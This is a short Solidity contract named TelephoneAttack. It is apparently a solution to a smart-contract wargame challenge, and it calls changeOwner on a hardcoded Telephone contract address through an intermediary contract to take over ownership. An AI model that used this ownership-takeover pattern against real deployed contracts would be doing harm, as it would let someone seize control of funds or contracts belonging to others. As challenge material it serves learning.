// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import './Telephone.sol';
contract TelephoneAttack {

  Telephone public tp1 = Telephone(0xcF3239707Ba542F9527Ef9aB3D9bDb7205a0612b);
  
  function t1(address owner) public {
      tp1.changeOwner(owner);
  }
}